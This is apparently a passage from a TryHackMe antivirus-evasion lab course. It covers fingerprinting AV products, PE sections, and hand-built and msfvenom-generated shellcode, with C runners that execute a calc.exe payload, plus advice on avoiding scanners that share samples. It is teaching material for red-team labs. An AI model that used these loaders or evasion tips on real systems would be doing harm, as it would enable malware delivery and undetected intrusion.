and isolated environment for better results. For more information and to
 check other features, you may visit the [VirusTotal](https://www.virustotal.com/) website.

# VirusTotal alternatives

**Important Note:** VirusTotal
 is a handy scanning platform with great features, but it has a sharing 
policy. All scanned results will be passed and shared with antivirus 
vendors to improve their products and update their databases for known 
malware. As a red teamer, this will burn a dropper or a payload you use 
in engagements. Thus, alternative solutions are available for testing 
against various security product vendors, and the most important 
advantage is that they do not have a sharing policy. However, there are 
other limitations. You will have a limited number of files to scan per 
day; otherwise, a subscription is needed for
 unlimited testing. For those reasons, we recommend you only test your 
malware on sites that do not share information, such as:

- [AntiscanMe](https://antiscan.me/) (6 free scans a day)
- [Virus Scan Jotti's malware scan](https://virusscan.jotti.org/)

# Fingerprinting software

As a red teamer, we do not know what AV
 software is in place once we gain initial access to a target machine. 
Therefore, it is important to find and identify what host-based security
 products are installed, including AV software. AV fingerprinting is an 
essential process to determine which AV vendor is present. Knowing which
 AV software is installed is also quite helpful in creating the same 
environment to test bypass techniques.

This section 
introduces different ways to look at and identify antivirus software 
based on static artifacts, including service names, process names, 
domain names, registry keys, and filesystems.

The following table contains well-known and commonly used AV software.

| **Antivirus Name** | **Service Name** | **Process Name** |
| --- | --- | --- |
| Microsoft Defender | WinDefend | MSMpEng.exe |
| Trend Micro | TMBMSRV | TMBMSRV.exe |
| Avira | AntivirService, Avira.ServiceHost | avguard.exe, Avira.ServiceHost.exe |
| Bitdefender | VSSERV | bdagent.exe, vsserv.exe |
| Kaspersky | AVP<Version #> | avp.exe, ksde.exe |
| AVG | AVG Antivirus | AVGSvc.exe |
| Norton | Norton Security | NortonSecurity.exe |
| McAfee | McAPExe, Mfemms | MCAPExe.exe, mfemms.exe |
| Panda | PavPrSvr | PavPrSvr.exe |
| Avast | Avast Antivirus | afwServ.exe, AvastSvc.exe |

# SharpEDRChecker

One way to fingerprint AV is by using public tools such as [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker). It is written in C# and performs various checks on a target machine, including checks for AV software, like running processes, files' metadata, loaded DLL files, Registry keys, services, directories, and files.

We have pre-downloaded the SharpEDRChecker from the [GitHub repo](https://github.com/PwnDexter/SharpEDRChecker) so that we can use it in the attached VM.
 Now we need to compile the project, and we have already created a 
shortcut to the project on the desktop (SharpEDRChecker). To do so, 
double-click on it to open it in Microsoft Visual Studio 2022. Now that 
we have our project ready, we need to compile it, as shown in the 
following screenshot:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9f2dc2083d2a8227b688cef623ac9bf8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9f2dc2083d2a8227b688cef623ac9bf8.png)

Once
 it is compiled, we can find the path of the compiled version in the 
output section, as highlighted in step 3. We also added a copy of the 
compiled version in the C:\Users\thm\Desktop\Files directory. Now let's try to run it and see the result as follows:

| Command Prompt!

`C:\> SharpEDRChecker.exe` | **➜** | SharpEDRChecker's Summary

`[!] Directory Summary:
   [-] C:\Program Files\Windows Defender : defender
   [-] C:\Program Files\Windows Defender Advanced Threat Protection : defender, threat
   [-] C:\Program Files (x86)\Windows Defender : defender

[!] Service Summary:
   [-] PsShutdownSvc : sysinternal
   [-] Sense : defender, threat
   [-] WdNisSvc : defender, nissrv
   [-] WinDefend : antimalware, defender, malware, msmpeng
   [-] wscsvc : antivirus` |
| --- | --- | --- |

As a result, the Windows Defender is found based on folders and services. Note that this program may be flagged by AV software as malicious since it does various checks and APIs calls.

# C# Fingerprint checks

Another way to enumerate AV software is by coding our own program. We have prepared a C# program in the provided Windows 10 Pro VM,
 so we can do some hands-on experiments! You can find the project's icon
 on the desktop (AV-Check) and double-click it to open it using 
Microsoft Visual Studio 2022.

The following C# code is straightforward, and its primary goal is to determine whether AV software is installed based on a predefined list of well-known AV applications.

```csharp
using System;
using System.Management;

internal class Program
{
    static void Main(string[] args)
    {
        var status = false;
        Console.WriteLine("[+] Antivirus check is running .. ");
        string[] AV_Check = {
            "MsMpEng.exe", "AdAwareService.exe", "afwServ.exe", "avguard.exe", "AVGSvc.exe",
            "bdagent.exe", "BullGuardCore.exe", "ekrn.exe", "fshoster32.exe", "GDScan.exe",
            "avp.exe", "K7CrvSvc.exe", "McAPExe.exe", "NortonSecurity.exe", "PavFnSvr.exe",
            "SavService.exe", "EnterpriseService.exe", "WRSA.exe", "ZAPrivacyService.exe"
        };
        var searcher = new ManagementObjectSearcher("select * from win32_process");
        var processList = searcher.Get();
        int i = 0;
        foreach (var process in processList)
        {
            int _index = Array.IndexOf(AV_Check, process["Name"].ToString());
            if (_index > -1)
            {
                Console.WriteLine("--AV Found: {0}", process["Name"].ToString());
                status = true;
            }
            i++;
        }
        if (!status) { Console.WriteLine("--AV software is not found!");  }
    }
}
```

Let's explain the code a bit more. We have predefined a list of well-known AV applications in the AV_Check array within our code, which is taken from the previous section, where we discussed fingerprinting AV software (table above). Then, we use the Windows Management Instrumentation Command-Line (WMIC) query (select * from win32_process) to list all currently running processes in the target machine and store them in the processList variable. Next, we go through the currently running processes and compare if they exist in the predefined array. If a match is found, then we have AV software installed.

The C# program utilizes a WMIC object to list current running processes, which may be monitored by AV
 software. If AV software is poorly implemented to monitor the WMIC 
queries or Windows APIs, it may cause false-positive results in scanning
 our C# program.

Let's compile an x86 version of the C# program, upload it to the VirusTotal website, and check the results! To compile the C# program in the Microsoft Visual Studio 2022, select **Build** from the bar menu and choose the **Build Solution**
 option. Then, if it complied correctly, you can find the path of the 
compiled version in the output section, as highlighted in step 3 in the 
screenshot below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/4abf4090797989e9457af9a2cb18a35b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/4abf4090797989e9457af9a2cb18a35b.png)

If we upload the AV-Check program to the [VirusTotal website](https://www.virustotal.com/gui/home/upload) and check the result, surprisingly, VirusTotal showed that two AV
 vendors (MaxSecure and SecureAge APEX) flagged our program as 
malicious! Thus, this is a false-positive result where it incorrectly 
identifies a file as malicious where it is not. One of the possible 
reasons is that these AV vendors' software uses a machine-learning 
classifier or rule-based detection method that is poorly implemented. 
For more details about the actual submission report, see [here](https://www.virustotal.com/gui/file/5f7d3e6cf58596a0186d89c20004c76805769f9ef93dc39e346e7331eee9e7ff?nocache=1).
 There are four main sections: Detection, Details, Behavior, and 
Community. If we check the Behavior section, we can see all calls of 
Windows APIs, Registry keys, modules, and the WMIC query.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/87289129012d58c2d77c1791131333c3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/87289129012d58c2d77c1791131333c3.png)

In
 the Detection section, there are Sigma rules that, if a system event 
during execution is matched (in the sandbox environment), consider the 
file malicious. This result is likely based on the rules; VirusTotal 
flagged our program because of the [Process Ghosting technique](https://pentestlaboratories.com/2021/12/08/process-ghosting/), as shown in the following screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4de9def10a394bc77b0b05580cae8e5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4de9def10a394bc77b0b05580cae8e5.png)

Now let's re-compile the C# program using an x64 CPU
 and check if the check engines act differently. In our submission 
attempt this time, three AV vendors' software (Cyren AV is added to the 
list) flagged the file as malicious. For more details about the actual submission report, look [here](https://www.virustotal.com/gui/file/b092173827888ed62adea0c2bf4f451175898d158608cf7090e668952314e308?nocache=1).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6992f821933117c890b129f63cbbcebf.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6992f821933117c890b129f63cbbcebf.png)

**Note:** if
 you try to submit a file to the VirusTotal website, it may give you a 
different result. Keep in mind that VirusTotal shares submission reports
 with the Antivirus vendors to improve their AV detection engines, including false-positive results.

**AV EVASION:SHELL CODE**

**PE Structure**

This task highlights some of the high-level essential elements of PE data structure for Windows binaries.

# What is PE?

Windows Executable file format, aka PE
 (Portable Executable), is a data structure that holds information 
necessary for files. It is a way to organize executable file code on a 
disk. Windows operating system components, such as Windows and DOS 
loaders, can load it into memory and execute it based on the parsed file
 information found in the PE.

In general, the default file structure of Windows binaries, such as EXE, DLL,
 and Object code files, has the same PE structure and works in the 
Windows operating system for both (x86 and x64) CPU architecture.

A PE
 structure contains various sections that hold information about the 
binary, such as metadata and links to a memory address of external 
libraries. One of these sections is the **PE Header**, which contains metadata information, pointers, and links to address sections in memory. Another section is the **Data section**, which includes ****containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ad61ff4aa1d4f649c02348dfa32eb613.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ad61ff4aa1d4f649c02348dfa32eb613.png)

There are different types of data containers in the PE structure, each holding different data.

1. **.text** stores the actual code of the program
2. **.data** holds the initialized and defined variables
3. **.bss** holds the uninitialized data (declared variables with no assigned values)
4. **.rdata** contains the read-only data
5. **.edata**: contains exportable objects and related table information
6. **.idata** imported objects and related table information
7. **.reloc** image relocation information
8. **.rsrc** links external resources used by the program such as images, icons, embedded
binaries, and manifest file, which has all information about program
versions, authors, company, and copyright!

The PE
 structure is a vast and complicated topic, and we are not going to go 
into too much detail regarding the headers and data sections. This task 
provides a high-level overview of the PE structure. If you are 
interested in gaining more information on the topic, we suggest checking
 the following THM rooms where the topic is explained in greater detail:

- [Windows Internals](https://tryhackme.com/room/windowsinternals)
- Dissecting PE Headers

You can also get more in-depth details about PE if you check the [Windows PE format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)'s Docs website.

When looking at the PE
 contents, we'll see it contains a bunch of bytes that aren't 
human-readable. However, it includes all the details the loader needs to
 run the file. The following are the example steps in which the Windows 
loader reads an executable binary and runs it as a process.

1. Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example,
    - The magic number starts with "MZ," which tells the loader that this is an EXE file.
    - File Signatures
    - Whether the file is compiled for x86 or x64 CPU architecture.
    - Creation timestamp.
2. Parsing the section table details, such as
    - Number of Sections the file contains.
3. Mapping the file contents into memory based on
    - The EntryPoint address and the offset of the ImageBase.
    - RVA: Relative Virtual Address, Addresses related to Imagebase.
4. Imports, DLLs, and other objects are loaded into the memory.
5. The EntryPoint address is located and the main execution function runs.

# Why do we need to know about PE?

There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure.

The other reason is that AV
 software and malware analysts analyze EXE files based on the 
information in the PE Header and other PE sections. Thus, to create or 
modify malware with AV evasion capability targeting
 a Windows machine, we need to understand the structure of Windows 
Portable Executable files and where the malicious shellcode can be 
stored.

We can control in which Data section to store
 our shellcode by how we define and initialize the shellcode variable. 
The following are some examples that show how we can store the shellcode
 in PE:

1. Defining the shellcode as a local variable within the main function will store it in the **.TEXT** PE section.
2. Defining the shellcode as a global variable will store it in the **.Data** section.
3. Another technique involves storing the shellcode as a raw binary in an icon
image and linking it within the code, so in this case, it shows up in
the **.rsrc** Data section.
4. We can add a custom data section to store the shellcode.

# PE-Bear

The attached VM
 is a Windows development machine that has the tools needed to parse EXE
 files and read the details we discussed. For your convenience, we have 
provided a copy of the PE-Bear software on the Desktop, which helps to 
check the PE structure: Headers, Sections, etc. PE-Bear provides a 
graphic user interface to show all relevant EXE details. To load an EXE 
file for analysis, select **File** -> **Load PEs** (Ctrl + O).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c51856efd63b36680857498bac814469.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c51856efd63b36680857498bac814469.png)

Once a file is loaded, we can see all PE
 details. The following screenshot shows PE details of the loaded file, 
including the headers and sections we discussed earlier in this task.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/78dca06d1d1e4249f25734af8082b8be.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/78dca06d1d1e4249f25734af8082b8be.png)

Now it is time to try it out! Load the **thm-intro2PE.exe** file to answer the questions below. The file is located in the following location: `c:\Tools\PE files\thm-intro2PE.exe`.

**Introduction to Shellcode**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7d8572294a70c545705aecc6c2453a3e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7d8572294a70c545705aecc6c2453a3e.png)

Shellcode is a set of crafted machine code instructions that tell the
  vulnerable program to run additional functions and, in most cases, provide access
  to a system shell or create a reverse command shell.

Once the shellcode is injected into a process and executed by the vulnerable
  software or program, it modifies the code run flow to update registers and
  functions of the program to execute the attacker's code.

It is generally written in Assembly language and translated into hexadecimal
  opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software
  significantly. But writing a custom shellcode requires excellent knowledge and
  skill in dealing with Assembly language, which is not an easy task!

# A Simple Shellcode!

In order to craft your own shellcode, a set of skills is required:

- A decent understanding of x86 and x64 CPU architectures.
- Assembly language.
- Strong knowledge of programming languages such as C.
- Familiarity with the Linux and Windows operating systems.

To generate our own shellcode, we need to write and extract 
bytes from the assembler machine code. For this task, we will be using 
the AttackBox to create a simple shellcode for Linux that writes the string "THM, Rocks!". The
    following assembly code uses two main functions:

- System Write function (sys_write) to print out a string we choose.
- System Exit function (sys_exit) to terminate the execution of the program.

To call those functions, we will use **syscalls**.
 A syscall is the way in which a program requests the kernel to do 
something. In this case, we will request the kernel to write a string to
 our screen, and the exit the program. Each operating system has a 
different calling convention regarding syscalls, meaning that to use the
 write in Linux,
 you'll probably use a different syscall than the one you'd use on 
Windows. For 64-bits Linux, you can call the needed functions from the 
kernel by setting up the following values:

| **rax** | **System Call** | **rdi** | **rsi** | **rdx** |
| --- | --- | --- | --- | --- |
| 0x1 | sys_write | unsigned int fd | const char *buf | size_t count |
| 0x3c | sys_exit | int error_code |  |  |

The
 table above tells us what values we need to set in different processor 
registers to call the sys_write and sys_exit functions using syscalls. 
For 64-bits Linux,
 the rax register is used to indicate the function in the kernel we wish
 to call. Setting rax to 0x1 makes the kernel execute sys_write, and 
setting rax to 0x3c will make the kernel execute sys_exit. Each of the 
two functions require some parameters to work, which can be set through 
the rdi, rsi and rdx registers. You can find a complete reference of 
available 64-bits Linux syscalls [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).

For `sys_write`, the first parameter sent through `rdi` is the file descriptor to write to. The second parameter in `rsi` is a pointer to the string we want to print, and the third in `rdx` is the size of the string to print.

For `sys_exit`, rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully.

Copy the following code to your AttackBox in a file called `thm.asm`:

```markup
global _start

section .text
_start:
    jmp MESSAGE      ; 1) let's jump to MESSAGE

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi          ; 3) we are popping into `rsi`; now we have the
                     ; address of "THM, Rocks!\r\n"
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is, in this case, the address
                      ; of "THM, Rocks!\r\n", is pushed into the stack.
    db "THM, Rocks!", 0dh, 0ah
```

Let's explain the ASM
 code a bit more. First, our message string is stored at the end of the 
.text section. Since we need a pointer to that message to print it, we 
will jump to the call instruction before the message itself. When `call GOBACK`
 is executed, the address of the next instruction after call will be 
pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a
    new line (\r\n).

Next, the program starts the GOBACK routine and prepares the
    required registers for our first sys_write() function.

- We specify the sys_write function by storing 1 in the rax register.
- We set rdi to 1 to print out the string to the user's console (STDOUT).
- We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi.
- With the syscall instruction, we execute the sys_write function with the values we prepared.
- For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program.

Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program.

Assembler and link our code

```
user@AttackBox$ nasm -f elf64 thm.asmuser@AttackBox$ ld thm.o -o thmuser@AttackBox$ ./thmTHM,Rocks!
```

We used the `nasm` command to compile the asm file, specifying the `-f elf64` option to indicate we are compiling for 64-bits Linux.
 Notice that as a result we obtain a .o file, which contains object 
code, which needs to be linked in order to be a working executable file.
 The `ld` command is used to link the object and obtain the final executable. The `-o` option is used to specify the name of the output executable file.

Now that we have the compiled ASM program, let's extract the shellcode with the `objdump` command by dumping the .text section of the compiled binary.

Dump the .text section

```
user@AttackBox$ objdump -d thmthm:     file format elf64-x86-64

Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 1e                	jmp    4000a0

0000000000400082 :
  400082:	b8 01 00 00 00       	mov    $0x1,%eax
  400087:	bf 01 00 00 00       	mov    $0x1,%edi
  40008c:	5e                   	pop    %rsi
  40008d:	ba 0d 00 00 00       	mov    $0xd,%edx
  400092:	0f 05                	syscall
  400094:	b8 3c 00 00 00       	mov    $0x3c,%eax
  400099:	bf 00 00 00 00       	mov    $0x0,%edi
  40009e:	0f 05                	syscall

00000000004000a0 :
  4000a0:	e8 dd ff ff ff       	callq  400082
  4000a5:	54                   	push   %rsp
  4000a6:	48                   	rex.W
  4000a7:	4d 2c 20             	rex.WRB sub $0x20,%al
  4000aa:	52                   	push   %rdx
  4000ab:	6f                   	outsl  %ds:(%rsi),(%dx)
  4000ac:	63 6b 73             	movslq 0x73(%rbx),%ebp
  4000af:	21                   	.byte 0x21
  4000b0:	0d                   	.byte 0xd
  4000b1:	0a                   	.byte 0xa
```

Now we need to extract the hex value from the above output. To do that, we can use `objcopy` to dump the `.text` section into a new file called `thm.text` in a binary format as follows:

Extract the .text section

```
user@AttackBox$ objcopy -j .text -O binary thm thm.text
```

The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The `xxd` command has the `-i` option that will output the binary file in a C string directly:

Output the hex equivalent to our shellcode

```
user@AttackBox$ xxd -i thm.textunsigned char new_text[] = {
  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
  0x0d, 0x0a
};
unsigned int new_text_len = 50;
```

Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work!

To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program.

```c
#include <stdio.h>int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,
        0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,
        0x0d, 0x0a
    };

    (*(void(*)())message)();
    return 0;
}
```

Then, we compile and execute it as follows,

Compiler our C program

```
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmxuser@AttackBox$ ./thmxTHM,Rocks!
```

Nice! it works. Note that we compile the C program by disabling the 
NX protection, which may prevent us from executing the code correctly in
 the data segment or stack.

Understanding shellcodes and how they are created is essential 
for the following tasks, especially when dealing with encrypting and 
encoding the shellcode.

Answer the questions below

Modify your C program to execute the following shellcode. What is the flag?

```markup
unsigned char message[] = {
  0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,
  0x34, 0x08, 0x01, 0x48, 0x83, 0xc1, 0x01, 0x48, 0x83, 0xf9, 0x19, 0x75,
  0xf2, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xba,
  0x19, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf,
  0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x55,
  0x49, 0x4c, 0x7a, 0x78, 0x31, 0x74, 0x73, 0x2c, 0x30, 0x72, 0x36, 0x2c,
  0x34, 0x69, 0x32, 0x30, 0x30, 0x62, 0x31, 0x65, 0x32, 0x7c, 0x0d, 0x0a
};
```

**Generate Shellcode**

In this task, we 
continue working with shellcode and demonstrate how to generate and 
execute shellcode using public tools such as the Metasploit framework.

# Generate shellcode using Public Tools

Shellcode can be generated for a specific format with a particular 
programming language. This depends on you. For example, if your dropper,
 which is the main exe file, contains the shellcode that will be sent to
 a victim, and is written in C, then we need to generate a shellcode 
format that works in C.

The advantage of generating shellcode via public tools is that 
we don't need to craft a custom shellcode from scratch, and we don't 
even need to be an expert in assembly language. Most public C2
 frameworks provide their own shellcode generator compatible with the C2
 platform. Of course, this is so convenient for us, but the drawback is 
that most, or we can say all, generated shellcodes are well-known to AV 
vendors and can be easily detected.

We will use Msfvenom on the AttackBox to generate a shellcode that executes Windows files. We will be creating a shellcode that runs the `calc.exe` application.

Generate Shellcode to Execute calc.exe

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f cNo encoder specified, outputting raw payload
Payload size: 193 bytes
Final size of c file: 835 bytes
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

As a result, the Metasploit
 framework generates a shellcode that executes the Windows calculator 
(calc.exe). The Windows calculator is widely used as an example in the 
Malware development process to show a proof of concept. If the technique
 works, then a new instance of the Windows calculator pops up. This 
confirms that any executable shellcode works with the method used.

# Shellcode injection

Hackers
 inject shellcode into a running or new thread and process using various
 techniques. Shellcode injection techniques modify the program's 
execution flow to update registers and functions of the program to 
execute the attacker's own code.

Now let's continue using the generated shellcode and execute it on the operating system. The following is a C code containing our generated shellcode which will be injected into memory and will execute "calc.exe".

On the AttackBox, let's save the following in a file named `calc.c`:

```c
#include <windows.h>char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```

Now let's compile it as an exe file:

Compile our C program for Windows

```
user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
```

Once we have our exe file, let's transfer it to the Windows 
machine and execute it. To transfer the file you can use smbclient from 
your AttackBox to access the SMB share at \\MACHINE_IP\Tools with the following commands (remember the password for the `thm` user is `Password321`):

Copy calc-MSC.exe to Windows Machine

```
user@AttackBox$ smbclient -U thm '//MACHINE_IP/Tools'smb: \> put calc-MSF.exe
```

This should copy your file in `C:\Tools\` in the Windows machine.

While your machine's AV should be disabled, feel free to try and upload your payload to the THM Antivirus Check at `http://MACHINE_IP/`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e90959ae18f71d51d7b8681676029493.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e90959ae18f71d51d7b8681676029493.png)

The Metasploit
 framework has many other shellcode formats and types for all your 
needs. We strongly suggest experimenting more with it and expanding your
 knowledge by generating different shellcodes.

The previous example shows how to generate shellcode and 
execute it within a target machine. Of course, you can replicate the 
same steps to create different types of shellcode, for example, the Meterpreter shellcode.

# Generate Shellcode from EXE files

Shellcode can also be stored in `.bin` files, which is a raw data format. In this case, we can get the shellcode of it using the `xxd -i` command.

C2 Frameworks provide shellcode as a raw binary file `.bin`. If this is the case, we can use the Linux system command `xxd` to get the hex representation of the binary file. To do so, we execute the following command: `xxd -i`.

Let's create a raw binary file using msfvenom to get the shellcode:

Generate a Raw shellcode to Execute calc.exe

```
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.binNo encoder specified, outputting raw payload
Payload size: 193 bytes

user@AttackBox$ file /tmp/example.bin/tmp/example.bin: data

```

And run the `xxd` command on the created file:

Get the shellcode using the xxd command

```
user@AttackBox$ xxd -i /tmp/example.binunsigned char _tmp_example_bin[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,
  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,
